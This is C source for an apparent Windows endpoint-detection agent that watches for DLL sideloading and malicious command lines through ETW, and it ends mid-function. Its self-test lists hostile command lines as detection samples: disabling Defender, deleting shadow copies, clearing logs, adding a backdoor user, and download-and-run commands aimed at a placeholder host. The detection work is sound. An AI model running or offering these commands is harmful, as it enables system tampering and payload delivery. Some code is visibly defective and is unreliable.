#define _WIN32_WINNT 0x0601
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <wctype.h>
#include <stdint.h>

typedef ULONGLONG TRACEHANDLE;
typedef struct { USHORT Id; UCHAR Version,Channel,Level,Opcode; USHORT Task; ULONGLONG Keyword; } EVENT_DESCRIPTOR_L;
typedef struct { USHORT Size,HeaderType,Flags,EventProperty; ULONG ThreadId,ProcessId; LARGE_INTEGER TimeStamp; GUID ProviderId; EVENT_DESCRIPTOR_L EventDescriptor; ULONG KernelTime,UserTime; GUID ActivityId; } EVENT_HEADER_L;
typedef struct { UCHAR ProcessorNumber,Alignment; USHORT LoggerId; } ETW_BUFFER_CONTEXT_L;
typedef struct { EVENT_HEADER_L EventHeader; ETW_BUFFER_CONTEXT_L BufferContext; USHORT ExtendedDataCount,UserDataLength; PVOID ExtendedData,UserData,UserContext; } EVENT_RECORD_L;
typedef struct { ULONG BufferSize,ProviderId; ULONGLONG HistoricalContext; LARGE_INTEGER TimeStamp; GUID Guid; ULONG ClientContext,Flags; } WNODE_HEADER_L;
typedef struct { WNODE_HEADER_L Wnode; ULONG BufferSize,MinimumBuffers,MaximumBuffers,MaximumFileSize,LogFileMode,FlushTimer,EnableFlags; LONG AgeLimit; ULONG NumberOfBuffers,FreeBuffers,EventsLost,BuffersWritten,LogBuffersLost,RealTimeBuffersLost; HANDLE LoggerThreadId; ULONG LogFileNameOffset,LoggerNameOffset; } EVENT_TRACE_PROPERTIES_L;
typedef struct { LONG Bias; WCHAR StandardName[32]; SYSTEMTIME StandardDate; LONG StandardBias; WCHAR DaylightName[32]; SYSTEMTIME DaylightDate; LONG DaylightBias; } TIME_ZONE_INFORMATION_L;
typedef struct { ULONG BufferSize,Version,ProviderVersion,NumberOfProcessors; LARGE_INTEGER EndTime; ULONG TimerResolution,MaximumFileSize,LogFileMode,BuffersWritten; GUID LogInstanceGuid; LPWSTR LoggerName,LogFileName; TIME_ZONE_INFORMATION_L TimeZone; LARGE_INTEGER BootTime,PerfFreq,StartTime; ULONG ReservedFlags,BuffersLost; } TRACE_LOGFILE_HEADER_L;
typedef VOID (WINAPI *PEVENT_RECORD_CB)(EVENT_RECORD_L*);
typedef ULONG (WINAPI *PBUFFER_CB)(PVOID);
typedef struct { LPWSTR LogFileName,LoggerName; LONGLONG CurrentTime; ULONG BuffersRead,ProcessTraceMode; BYTE CurrentEvent[256]; TRACE_LOGFILE_HEADER_L LogfileHeader; PBUFFER_CB BufferCallback; ULONG BufferSize,Filled,EventsLost; union { PVOID EventCallback; PEVENT_RECORD_CB EventRecordCallback; }; ULONG IsKernelTrace; PVOID Context; } EVENT_TRACE_LOGFILE_L;
typedef struct { ULONG Flags,NameOffset; union { struct { USHORT InType,OutType; ULONG MapNameOffset; } T; struct { USHORT StructStartIndex,NumOfStructMembers; ULONG Padding; } S; }; USHORT Count,Length; ULONG Reserved; } EVENT_PROPERTY_INFO_L;
typedef struct { GUID ProviderGuid,EventGuid; EVENT_DESCRIPTOR_L EventDescriptor; ULONG DecodingSource,ProviderNameOffset,LevelNameOffset,ChannelNameOffset,KeywordsNameOffset,TaskNameOffset,OpcodeNameOffset,EventMessageOffset,ProviderMessageOffset,BinaryXMLOffset,BinaryXMLSize,ActivityIDNameOffset,RelatedActivityIDNameOffset,PropertyCount,TopLevelPropertyCount,Flags; EVENT_PROPERTY_INFO_L EventPropertyInfoArray[1]; } TRACE_EVENT_INFO_L;
typedef struct { ULONGLONG PropertyName; ULONG ArrayIndex,Reserved; } PROPERTY_DATA_DESCRIPTOR_L;
#define WNODE_FLAG_TRACED_GUID 0x00020000
#define EVENT_TRACE_REAL_TIME_MODE 0x00000100
#define EVENT_TRACE_SYSTEM_LOGGER_MODE 0x02000000
#define EVENT_TRACE_FLAG_PROCESS 0x00000001
#define EVENT_TRACE_FLAG_IMAGE_LOAD 0x00000004
#define PROCESS_TRACE_MODE_REAL_TIME 0x00000100
#define PROCESS_TRACE_MODE_EVENT_RECORD 0x10000000
#ifndef ERROR_ALREADY_EXISTS
#define ERROR_ALREADY_EXISTS 183
#endif
#define MAX_HITS 512
#define IMAGE_LOAD_EVENT 10
#ifndef PROCESS_QUERY_LIMITED_INFORMATION
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
#endif

typedef ULONG (WINAPI *PFN_START)(TRACEHANDLE*,LPCWSTR,EVENT_TRACE_PROPERTIES_L*);
typedef ULONG (WINAPI *PFN_CONTROL)(TRACEHANDLE,LPCWSTR,EVENT_TRACE_PROPERTIES_L*,ULONG);
typedef TRACEHANDLE (WINAPI *PFN_OPEN)(EVENT_TRACE_LOGFILE_L*);
typedef ULONG (WINAPI *PFN_PROCESS)(TRACEHANDLE*,ULONG,LPFILETIME,LPFILETIME);
typedef ULONG (WINAPI *PFN_CLOSE)(TRACEHANDLE);
typedef ULONG (WINAPI *PFN_TDH_INFO)(EVENT_RECORD_L*,ULONG,PVOID,TRACE_EVENT_INFO_L*,ULONG*);
typedef ULONG (WINAPI *PFN_TDH_SIZE)(EVENT_RECORD_L*,ULONG,PVOID,ULONG,PROPERTY_DATA_DESCRIPTOR_L*,ULONG*);
typedef ULONG (WINAPI *PFN_TDH_GET)(EVENT_RECORD_L*,ULONG,PVOID,ULONG,PROPERTY_DATA_DESCRIPTOR_L*,ULONG,PBYTE);
typedef BOOL (WINAPI *PFN_QUERY_IMAGE)(HANDLE,DWORD,LPWSTR,PDWORD);
typedef BOOL (WINAPI *PFN_ENUM_PROCESSES)(DWORD*,DWORD,DWORD*);
static PFN_START pStart;static PFN_CONTROL pControl;static PFN_OPEN pOpen;static PFN_PROCESS pProcess;static PFN_CLOSE pClose;static PFN_ENUM_PROCESSES pEnumProcesses;static PFN_TDH_INFO pTdhInfo;static PFN_TDH_SIZE pTdhSize;static PFN_TDH_GET pTdhGet;static PFN_QUERY_IMAGE pQueryImage;
static WCHAR g_session[]=L"NT Kernel Logger",g_pipe[]=L"\\\\.\\pipe\\SevenAgentIPC";static DWORD g_parent;static HANDLE g_pipe_handle=INVALID_HANDLE_VALUE;static volatile LONG g_running=1;static LONG g_bad=0;static TRACEHANDLE g_session_handle;static EVENT_TRACE_PROPERTIES_L*g_props;static TRACEHANDLE g_session_handle;static EVENT_TRACE_PROPERTIES_L*g_props;
typedef struct {DWORD pid;ULONGLONG tick;WCHAR module[MAX_PATH];} HIT;static HIT g_hits[MAX_HITS];static LONG g_hit_count;static CRITICAL_SECTION g_lock;
static int has(const WCHAR*s,const WCHAR*q){WCHAR a[MAX_PATH*2],b[128];DWORD i;if(!s||!q)return 0;for(i=0;s[i]&&i<MAX_PATH*2-1;i++)a[i]=(WCHAR)towlower(s[i]);a[i]=0;for(i=0;q[i]&&i<127;i++)b[i]=(WCHAR)towlower(q[i]);b[i]=0;return wcsstr(a,b)!=0;}
static int sensitive_dll(const WCHAR*p){return has(p,L"\\version.dll")||has(p,L"\\winmm.dll")||has(p,L"\\dbghelp.dll")||has(p,L"\\dxgi.dll")||has(p,L"\\d3d9.dll")||has(p,L"\\d3d11.dll")||has(p,L"\\winhttp.dll")||has(p,L"\\wintrust.dll")||has(p,L"\\usp10.dll");}
static int user_path(const WCHAR*p){return has(p,L"\\appdata\\")||has(p,L"\\temp\\")||has(p,L"\\downloads\\")||has(p,L"\\users\\public\\")||has(p,L"\\programdata\\");}
static int risky_host(const WCHAR*p){return has(p,L"\\rundll32.exe")||has(p,L"\\regsvr32.exe")||has(p,L"\\mshta.exe")||has(p,L"\\installutil.exe")||has(p,L"\\control.exe");}
static int exempt(const WCHAR*p){return has(p,L"\\sevenagent\\")||has(p,L"\\sevenendpointsecurity\\")||has(p,L"\\sevenendpoint.exe");}
static int process_path(DWORD pid,WCHAR*out,DWORD cap);
static DWORD find_controller(void){HMODULE m=LoadLibraryW(L"psapi.dll");PFN_ENUM_PROCESSES fn;DWORD ids[4096],need=0,i;WCHAR p[MAX_PATH];if(!m)return 0;fn=(PFN_ENUM_PROCESSES)GetProcAddress(m,"EnumProcesses");if(!fn||!fn(ids,sizeof(ids),&need))return 0;for(i=0;i<need/sizeof(DWORD);i++){if(ids[i]&&ids[i]!=GetCurrentProcessId()&&process_path(ids[i],p,MAX_PATH)){WCHAR*base=wcsrchr(p,L"\\");base=base?base+1:p;if(!_wcsicmp(base,L"SevenEndPoint.exe"))return ids[i];}}return 0;}
static int process_path(DWORD pid,WCHAR*out,DWORD cap){HANDLE h=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);DWORD n=cap;int ok=0;out[0]=0;if(h){ok=pQueryImage&&pQueryImage(h,0,out,&n);CloseHandle(h);}return ok;}
static int pipe_connect(void){int i;for(i=0;i<120&&g_running;i++){g_pipe_handle=CreateFileW(g_pipe,GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);if(g_pipe_handle!=INVALID_HANDLE_VALUE)return 1;Sleep(250);}return 0;}
static void send_alert(DWORD pid,const WCHAR*module){char msg[4096],esc[2048];DWORD n,i=0,j=0;WCHAR c;if(g_pipe_handle==INVALID_HANDLE_VALUE&&!pipe_connect())return;while(module[i]&&j+6<sizeof(esc)){c=module[i++];if(c==L'\\'||c==L'"'){esc[j++]='\\';esc[j++]=(char)c;}else if(c<0x20||c>0x7e){_snprintf(esc+j,7,"\\u%04x",(unsigned)c);j+=6;}else esc[j++]=(char)c;}esc[j]=0;_snprintf(msg,sizeof(msg),"{\"pid\":%lu,\"rule\":\"Agent.HighConfidence.SideloadChain\",\"behavior\":\"ImageLoad.SuspiciousSideload\",\"family\":\"SilverFox\",\"module\":\"%s\"}\n",(unsigned long)pid,esc);if(!WriteFile(g_pipe_handle,msg,(DWORD)strlen(msg),&n,NULL)){CloseHandle(g_pipe_handle);g_pipe_handle=INVALID_HANDLE_VALUE;}}
static int get_module(EVENT_RECORD_L*r,TRACE_EVENT_INFO_L*info,ULONG info_bytes,WCHAR*out,DWORD cap){ULONG i,sz,off;PROPERTY_DATA_DESCRIPTOR_L d;BYTE val[1024];WCHAR*name;for(i=0;i<info->TopLevelPropertyCount&&i<info->PropertyCount;i++){off=info->EventPropertyInfoArray[i].NameOffset;if(off>=info_bytes)continue;name=(WCHAR*)((BYTE*)info+off);if(!has(name,L"image")&&!has(name,L"file")&&!has(name,L"path"))continue;ZeroMemory(&d,sizeof(d));d.PropertyName=(ULONGLONG)(ULONG_PTR)name;d.ArrayIndex=0xffffffff;sz=0;if(pTdhSize(r,0,NULL,1,&d,&sz)!=0||sz<2||sz>sizeof(val)||(sz&1))continue;if(pTdhGet(r,0,NULL,1,&d,sz,val)!=0)continue;{DWORD c=sz/2;if(c>=cap)c=cap-1;memcpy(out,val,c*2);out[c]=0;if(out[0])return 1;}}return 0;}
#include <stdlib.h>
/* ===== v2 rules engine: external JSON rules, v1 SideloadChain logic untouched ===== */
#define V2_PAT_MAX 400
#define V2_RULES_MAX 4
#define V2_CB_MAX 256
typedef struct {char match[128];char context[128];char type[32];char mitre[16];char note[160];}V2PAT;
typedef struct {char id[64];char behavior[96];char level[16];int score;int npat;V2PAT pats[V2_PAT_MAX];}RULE2;
static RULE2 g_v2[V2_RULES_MAX];static int g_v2_count=0;
static int g_combo_th=60,g_combo_types=3,g_susp_th=30,g_susp_types=2,g_mod_score=20,g_window_ms=120000;
static char g_combo_rule[64]="Agent.Combo.HighConfidence",g_combo_behavior[96]="ProcessCombo.SuspiciousChain";
static char g_susp_rule[64]="Agent.Combo.SuspectChain",g_susp_behavior[96]="ProcessCombo.SuspectChain";
static char g_rules_path[MAX_PATH];static int g_selftest=0;
typedef struct JV{int t;char*s;double n;struct JV**kids;char**keys;int nkid;}JV;
static HANDLE g_arena=NULL;
static void*ja(size_t n){return HeapAlloc(g_arena,HEAP_ZERO_MEMORY,n);}
static JV*jobj_new(void){JV*v=(JV*)ja(sizeof(JV));v->t=0;v->keys=(char**)ja(64*sizeof(char*));v->kids=(JV**)ja(64*sizeof(JV*));return v;}
static JV*jarr_new(void){JV*v=(JV*)ja(sizeof(JV));v->t=1;v->kids=(JV**)ja(512*sizeof(JV*));return v;}
static void jpush(JV*v,JV*k,const char*key){int cap=(v->t==1)?512:64;if(v->nkid>=cap)return;if(key)v->keys[v->nkid]=(char*)key;v->kids[v->nkid++]=k;}
static JV*jget(JV*v,const char*key){int i;if(!v||v->t!=0)return NULL;for(i=0;i<v->nkid;i++)if(v->keys[i]&&!strcmp(v->keys[i],key))return v->kids[i];return NULL;}
static const char*jstr(JV*v){return (v&&v->t==2)?v->s:"";}
static const char*jp_skip(const char*p){while(*p==' '||*p=='\t'||*p=='\r'||*p=='\n')p++;return p;}
static const char*jp_str(const char*p,char*out,int cap){int i=0;out[0]=0;if(*p!='"')return p;p++;while(*p&&*p!='"'&&i<cap-1){char c=*p;if(c=='\\'&&p[1]){p++;char e=*p;c=e;if(e=='n')c='\n';else if(e=='t')c='\t';else if(e=='r')c='\r';else if(e=='u'&&p[1]&&p[2]&&p[3]&&p[4]){unsigned v=0;int k;for(k=1;k<=4;k++){char h=p[k];v=(v<<4);if(h>='0'&&h<='9')v+=(unsigned)(h-'0');else if(h>='A'&&h<='F')v+=(unsigned)(h-'A'+10);else if(h>='a'&&h<='f')v+=(unsigned)(h-'a'+10);}p+=4;if(v<128)c=(char)v;else c='?';}}out[i++]=c;p++;}out[i]=0;if(*p=='"')p++;return p;}
static const char*jp_val(const char*p,JV**out);
static const char*jp_val(const char*p,JV**out){p=jp_skip(p);*out=NULL;
 if(*p=='{'){JV*o=jobj_new();p=jp_skip(p+1);while(*p&&*p!='}'){char*k;p=jp_skip(p);if(*p!='"')return p;k=(char*)ja(160);p=jp_str(p,k,160);p=jp_skip(p);if(*p==':')p++;{JV*cv;p=jp_val(p,&cv);if(!cv)return p;jpush(o,cv,k);}p=jp_skip(p);if(*p==',')p++;}if(*p=='}')p++;*out=o;return p;}
 if(*p=='['){JV*a=jarr_new();p=jp_skip(p+1);while(*p&&*p!=']'){JV*k;p=jp_val(p,&k);if(!k)return p;jpush(a,k,NULL);p=jp_skip(p);if(*p==',')p++;}if(*p==']')p++;*out=a;return p;}
 if(*p=='"'){char*s=(char*)ja(4096);p=jp_str(p,s,4096);{JV*v=(JV*)ja(sizeof(JV));v->t=2;v->s=s;*out=v;}return p;}
 if(!strncmp(p,"true",4)){JV*v=(JV*)ja(sizeof(JV));v->t=4;v->n=1;*out=v;p+=4;return p;}
 if(!strncmp(p,"false",5)){JV*v=(JV*)ja(sizeof(JV));v->t=4;v->n=0;*out=v;p+=5;return p;}
 if(!strncmp(p,"null",4)){JV*v=(JV*)ja(sizeof(JV));v->t=5;*out=v;p+=4;return p;}
 {char*end=NULL;double d=strtod(p,&end);if(end&&end>p){JV*v=(JV*)ja(sizeof(JV));v->t=3;v->n=d;*out=v;return end;}}
 return p;}
static void v2_load(void){JV*root=NULL,*rules,*combo;int i,k;
 g_arena=HeapCreate(0,0,0);if(!g_arena)return;
 {char*buf=(char*)ja(2097152);HANDLE f;DWORD n=0;
  f=CreateFileA(g_rules_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
  if(f==INVALID_HANDLE_VALUE){fwprintf(stderr,L"[v2] open failed err=%lu
",(unsigned long)GetLastError());HeapDestroy(g_arena);g_arena=NULL;return;}
  ReadFile(f,buf,2097152,&n,NULL);CloseHandle(f);buf[n]=0;
  if(g_selftest)fwprintf(stderr,L"[v2] bytes=%lu
",(unsigned long)n);
  {const char*p=jp_val(buf,&root);if(!root||root->t!=0){int off=(int)(p-buf);fwprintf(stderr,L"[v2] parse failed root=%p t=%d off=%d ctx=[%.40S]
",root,root?root->t:-1,off,(root?(const wchar_t*)L"?" : (const wchar_t*)(buf+ (off>20?off-20:0))));HeapDestroy(g_arena);g_arena=NULL;return;}}
  if(g_selftest){JV*rl=jget(root,"rules");if(rl)fwprintf(stderr,L"[v2] rules nkid=%d
",rl->nkid);{int q;for(q=0;q<((rl&&rl->t==1)?rl->nkid:0);q++){JV*r2=rl->kids[q];JV*kd=jget(r2,"kind");fwprintf(stderr,L"  [%d] kind=%S id=%S
",q,kd?jstr(kd):"(null)",jget(r2,"id")?jstr(jget(r2,"id")):"(null)");}}}}
 rules=jget(root,"rules");
 if(rules&&rules->t==1)for(i=0;i<rules->nkid&&g_v2_count<V2_RULES_MAX;i++){JV*r=rules->kids[i];JV*kind=jget(r,"kind");
  if(!kind||strcmp(jstr(kind),"ProcessCmdline"))continue;
  {RULE2*d=&g_v2[g_v2_count];JV*ps=jget(r,"patterns");JV*t;
   t=jget(r,"id");if(t){strncpy(d->id,jstr(t),63);d->id[63]=0;}
   t=jget(r,"behavior");if(t){strncpy(d->behavior,jstr(t),95);d->behavior[95]=0;}
   t=jget(r,"level");if(t){strncpy(d->level,jstr(t),15);d->level[15]=0;}
   t=jget(r,"score");d->score=(t&&(t->t==3||t->t==4))?(int)t->n:0;
   if(ps&&ps->t==1){int j;for(j=0;j<ps->nkid&&d->npat<V2_PAT_MAX;j++){JV*po=ps->kids[j];V2PAT*dp=&d->pats[d->npat];JV*tv;
    tv=jget(po,"match");if(tv){strncpy(dp->match,jstr(tv),127);dp->match[127]=0;}
    tv=jget(po,"context");if(tv){strncpy(dp->context,jstr(tv),127);dp->context[127]=0;}
    tv=jget(po,"type");if(tv){strncpy(dp->type,jstr(tv),31);dp->type[31]=0;}
    tv=jget(po,"mitre");if(tv){strncpy(dp->mitre,jstr(tv),15);dp->mitre[15]=0;}
    tv=jget(po,"note");if(tv){strncpy(dp->note,jstr(tv),159);dp->note[159]=0;}
    d->npat++;}}
   g_v2_count++;}}
 combo=jget(root,"combo");
 if(combo&&combo->t==0){JV*t;
  t=jget(combo,"combo_threshold");if(t)g_combo_th=(int)t->n;
  t=jget(combo,"combo_min_types");if(t)g_combo_types=(int)t->n;
  t=jget(combo,"suspect_threshold");if(t)g_susp_th=(int)t->n;
  t=jget(combo,"suspect_min_types");if(t)g_susp_types=(int)t->n;
  t=jget(combo,"module_load_score");if(t)g_mod_score=(int)t->n;
  t=jget(combo,"window_seconds");if(t)g_window_ms=((int)t->n)*1000;
  t=jget(combo,"combo_rule");if(t){strncpy(g_combo_rule,jstr(t),63);g_combo_rule[63]=0;}
  t=jget(combo,"combo_behavior");if(t){strncpy(g_combo_behavior,jstr(t),95);g_combo_behavior[95]=0;}
  t=jget(combo,"suspect_rule");if(t){strncpy(g_susp_rule,jstr(t),63);g_susp_rule[63]=0;}
  t=jget(combo,"suspect_behavior");if(t){strncpy(g_susp_behavior,jstr(t),95);g_susp_behavior[95]=0;}}
}
static RULE2*v2_match(const char*up,RULE2**rr,V2PAT**pp){int i,j;
 for(i=0;i<g_v2_count;i++){RULE2*r=&g_v2[i];for(j=0;j<r->npat;j++){V2PAT*p=&r->pats[j];
  if(strstr(up,p->match)&&(!p->context[0]||strstr(up,p->context))){*rr=r;*pp=p;return r;}}}
 return NULL;}
typedef struct{DWORD pid;ULONGLONG tick;int ntypes;char types[8][32];int sum;int combo_done;int susp_done;}CBST;
static CBST g_cb[V2_CB_MAX];static int g_cb_n=0;
static void cb_purge(ULONGLONG now){int i;for(i=0;i<g_cb_n;i++)if(now-g_cb[i].tick>(ULONGLONG)g_window_ms){g_cb[i]=g_cb[g_cb_n-1];g_cb_n--;i--;}}
static CBST*cb_accum(DWORD pid,const char*type,int score,ULONGLONG now){int i;CBST*e=NULL;
 cb_purge(now);
 for(i=0;i<g_cb_n;i++)if(g_cb[i].pid==pid){e=&g_cb[i];break;}
 if(!e&&g_cb_n<V2_CB_MAX){e=&g_cb[g_cb_n++];e->pid=pid;e->tick=now;}
 if(!e)return NULL;
 e->tick=now;
 for(i=0;i<e->ntypes;i++)if(!strcmp(e->types[i],type))return e;
 if(e->ntypes<8){strncpy(e->types[e->ntypes],type,31);e->types[e->ntypes][31]=0;e->ntypes++;e->sum+=score;}
 return e;}
static void alert2(DWORD pid,const char*rid,const char*beh,const char*family,const WCHAR*module,const char*detail,int score,const char*action)
{char msg[4096],esc[2048];DWORD n,i=0,j=0;WCHAR c;
 if(g_selftest){fwprintf(stderr,L"[SelfTest-ALERT] rule=%S pid=%lu score=%d action=%S detail=%S\n",rid,(unsigned long)pid,score,action,detail);return;}
 if(g_pipe_handle==INVALID_HANDLE_VALUE&&!pipe_connect())return;
 while(module[i]&&j+6<sizeof(esc)){c=module[i++];if(c==L'\\'||c==L'"'){esc[j++]='\\';esc[j++]=(char)c;}else if(c<0x20||c>0x7e){_snprintf(esc+j,7,"\\u%04x",(unsigned)c);j+=6;}else esc[j++]=(char)c;}
 esc[j]=0;
 _snprintf(msg,sizeof(msg),"{\"pid\":%lu,\"rule\":\"%s\",\"behavior\":\"%s\",\"family\":\"%s\",\"module\":\"%s\",\"detail\":\"%s\",\"score\":%d,\"action\":\"%s\"}\n",
  (unsigned long)pid,rid,beh,family,esc,detail,score,action);
 if(!WriteFile(g_pipe_handle,msg,(DWORD)strlen(msg),&n,NULL)){CloseHandle(g_pipe_handle);g_pipe_handle=INVALID_HANDLE_VALUE;}}
static void combo_eval(DWORD pid,const WCHAR*module,ULONGLONG now){int i;CBST*e=NULL;
 for(i=0;i<g_cb_n;i++)if(g_cb[i].pid==pid){e=&g_cb[i];break;}
 if(!e)return;
 if(!e->combo_done&&e->ntypes>=g_combo_types&&e->sum>=g_combo_th){e->combo_done=1;
  alert2(pid,g_combo_rule,g_combo_behavior,"Combo",module,"behavior-chain combo threshold",e->sum,"terminate");return;}
 if(!e->susp_done&&e->ntypes>=g_susp_types&&e->sum>=g_susp_th){e->susp_done=1;
  alert2(pid,g_susp_rule,g_susp_behavior,"Combo",module,"behavior-chain suspect threshold",e->sum,"report");}}
static void v2_proc_start(EVENT_RECORD_L*r){ULONG bytes=0,rc;TRACE_EVENT_INFO_L*info;DWORD pid=r->EventHeader.ProcessId;WCHAR host[MAX_PATH];
 char up[2048];int i,j,hit_rule=-1;V2PAT*pp=NULL;RULE2*rr=NULL;
 if(!pid||pid==g_parent||pid==GetCurrentProcessId())return;
 rc=pTdhInfo(r,0,NULL,NULL,&bytes);
 if(rc!=122||bytes<sizeof(TRACE_EVENT_INFO_L)||bytes>65536)return;
 info=(TRACE_EVENT_INFO_L*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,bytes);if(!info)return;
 rc=pTdhInfo(r,0,NULL,info,&bytes);
 if(rc){HeapFree(GetProcessHeap(),0,info);return;}
 up[0]=0;
 for(i=0;i<info->TopLevelPropertyCount&&i<info->PropertyCount;i++){ULONG off=info->EventPropertyInfoArray[i].NameOffset;WCHAR*name;PROPERTY_DATA_DESCRIPTOR_L d;BYTE val[4096];ULONG sz;
  if(off>=bytes)continue;name=(WCHAR*)((BYTE*)info+off);
  if(!has(name,L"command"))continue;
  ZeroMemory(&d,sizeof(d));d.PropertyName=(ULONGLONG)(ULONG_PTR)name;d.ArrayIndex=0xffffffff;sz=0;
  if(pTdhSize(r,0,NULL,1,&d,&sz)!=0||sz<2||sz>sizeof(val)||(sz&1))continue;
  if(pTdhGet(r,0,NULL,1,&d,sz,val)!=0)continue;
  {DWORD cch=sz/2;j=0;WCHAR*w=(WCHAR*)val;
   while(j<cch&&w[j]&&j+1<sizeof(up)){unsigned wc=(unsigned)w[j++];up[j-1]=(wc>=128)?'?':(char)(wc>='a'&&wc<='z'?wc-32:wc);}}
  up[j]=0;break;}
 HeapFree(GetProcessHeap(),0,info);
 if(!up[0])return;
 if(!process_path(pid,host,MAX_PATH)||exempt(host))return;
 for(i=0;i<g_v2_count;i++)if(g_v2[i].level[0]=='m'&&strstr(up,"")){}
 for(i=0;i<g_v2_count&&hit_rule<0;i++){RULE2*r2=&g_v2[i];int j;
  for(j=0;j<r2->npat;j++){V2PAT*p=&r2->pats[j];
   if(strstr(up,p->match)&&(!p->context[0]||strstr(up,p->context))){hit_rule=i;pp=p;break;}}}
 if(hit_rule>=0){RULE2*r2=&g_v2[hit_rule];
  if(r2->level[0]=='m'){alert2(pid,r2->id,r2->behavior,r2->level,host,pp->note,r2->score,"terminate");return;}
  {ULONGLONG now=GetTickCount();cb_accum(pid,pp->type,r2->score,now);combo_eval(pid,host,now);return;}}
 return;}
static int v2_selftest(void){
 static const char*ben[]={"IPCONFIG /ALL","NET STOP SPOOLER","NET STOP WUAUSERV","TASKKILL /PID 3601 /F","TASKKILL /IM NOTEPAD.EXE","REG ADD HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN /V TEST /D C:\\X.EXE /F","POWERSHELL -COMMAND GET-PROCESS","POWERSHELL GET-PROCESS","CERTUTIL -HASHFILE C:\\A.EXE SHA256","CERTUTIL -ENUMSTORE","MSHTA C:\\LOCAL\\TEST.HTA","CMD /C DIR","SCHTASKS /QUERY /FO LIST","WMIC CPU GET NAME","DISM /ONLINE /GET-FEATURES","ROBOCOPY C:\\A C:\\B /E","VSSADMIN LIST SHADOWS","BCDEDIT /ENUM","NET USER ADMINISTRATOR","SC QUERY WINDEFEND","NET START","NETSH INTERFACE SHOW INTERFACE","RUNDLL32 SHELL32.DLL,CONTROL_RUNDLL","CIPHER /S:C:\\USERS","SC CONFIG SPOOLER START= AUTO"};
 static const char*mal[]={"NET STOP WINDEFEND","SC STOP WINDEFEND","SC CONFIG WINDEFEND START= DISABLED","TASKKILL /IM MSMPENG /F","TASKKILL /IM HIPSTRAY /F","FLTMC UNLOAD","VSSADMIN DELETE SHADOWS /ALL /QUIET","BCDEDIT /SET RECOVERYENABLED NO","WBADMIN DELETE CATALOG -QUIET","DISKSHADOW","ADD-MPPREFERENCE -EXCLUSIONPATH C:\\X","WEVTUTIL CL SECURITY","MSHTA VBSCRIPT:MSGBOX"};
 static const char*sus[]={"NET USER BACKDOOR P@SS /ADD","AUDITPOL /SET /SUCCESS:DISABLE","RUNDLL32 C:\\TEMP\\A.DLL,Entry","REG ADD HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\WINLOGON /V USERINIT","WMIC PROCESS CALL CREATE CMD","POWERSHELL -ENC  SQBFAFgA","POWERSHELL -ENCODEDCOMMAND SQBF","POWERSHELL -W HIDDEN -NOP","CERTUTIL -URLCACHE -F HTTP://X/A.EXE","CERTUTIL -DECODE A.TXT B.EXE","BITSADMIN /TRANSFER J HTTP://X/A.EXE C:\\A.EXE","MSHTA HTTP://X/A.HTA","REGSVR32 /I:HTTP://X SCROBJ.DLL","RUNDLL32 JAVASCRIPT:PAYLOAD","SCHTASKS /CREATE /RU SYSTEM /TN T /TR X","POWERSHELL -NOPROFILE -EXECUTIONPOLICY BYPASS"};
 int i,ok=1,nb,nm,ns,nbhit=0,nmhit=0,nshit=0;
 nb=(int)(sizeof(ben)/sizeof(ben[0]));nm=(int)(sizeof(mal)/sizeof(mal[0]));ns=(int)(sizeof(sus)/sizeof(sus[0]));
 fwprintf(stderr,L"[SelfTest] rules loaded=%d path=%S\n",g_v2_count,g_rules_path);
 for(i=0;i<nb;i++){V2PAT*pp=NULL;RULE2*rr=NULL;
  if(v2_match(ben[i],&rr,&pp)&&rr->level[0]=='m'){nbhit++;ok=0;fwprintf(stderr,L"[SelfTest] FP: %S -> %S / %S\n",ben[i],rr->id,pp->note);}}
 for(i=0;i<nm;i++){V2PAT*pp=NULL;RULE2*rr=NULL;
  if(!v2_match(mal[i],&rr,&pp)||rr->level[0]!='m'){nmhit++;ok=0;fwprintf(stderr,L"[SelfTest] MISS: %S\n",mal[i]);}}
 for(i=0;i<ns;i++){V2PAT*pp=NULL;RULE2*rr=NULL;
  if(!v2_match(sus[i],&rr,&pp)||rr->level[0]!='s'){nshit++;ok=0;fwprintf(stderr,L"[SelfTest] SUS-MISS: %S\n",sus[i]);}}
 {DWORD fake=0xBEEF;ULONGLONG now=GetTickCount();g_selftest=1;g_cb_n=0;
  cb_accum(fake,"USERMODULELOAD",g_mod_score,now);
  cb_accum(fake,"CmdExec",30,now);
  cb_accum(fake,"SecSetting",10,now+1000);
  combo_eval(fake,L"C:\\TEST\\VERSION.DLL",now+1000);
  {int fired=0;int q;for(q=0;q<g_cb_n;q++)if(g_cb[q].pid==fake&&g_cb[q].combo_done)fired=1;
   if(!fired){ok=0;fwprintf(stderr,L"[SelfTest] COMBO MISS (60/3 chain)\n");}}
  g_cb_n=0;g_selftest=0;}
 fwprintf(stderr,L"[SelfTest] benign=%d fp=%d malicious=%d miss=%d suspect=%d miss=%d => %S\n",nb,nbhit,nm,nmhit,ns,nshit,ok?"PASS":"FAIL");
 return ok?0:1;}

/* ===== end v2 ===== */

static void WINAPI on_record(EVENT_RECORD_L*r){ULONG bytes=0,rc;TRACE_EVENT_INFO_L*info;WCHAR module[MAX_PATH],host[MAX_PATH];DWORD pid;LONG i;ULONGLONG now;int hit=0;if(!r)return;if(r->EventHeader.EventDescriptor.Id==1){v2_proc_start(r);return;}if(r->EventHeader.EventDescriptor.Id!=IMAGE_LOAD_EVENT)return;pid=r->EventHeader.ProcessId;if(!pid||pid==g_parent||pid==GetCurrentProcessId())return;rc=pTdhInfo(r,0,NULL,NULL,&bytes);if(rc!=122||bytes<sizeof(TRACE_EVENT_INFO_L)||bytes>65536){InterlockedIncrement(&g_bad);return;}info=(TRACE_EVENT_INFO_L*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,bytes);if(!info)return;rc=pTdhInfo(r,0,NULL,info,&bytes);if(rc||!get_module(r,info,bytes,module,MAX_PATH)){HeapFree(GetProcessHeap(),0,info);InterlockedIncrement(&g_bad);return;}HeapFree(GetProcessHeap(),0,info);if(!sensitive_dll(module)||!user_path(module)||exempt(module))return;{ULONGLONG 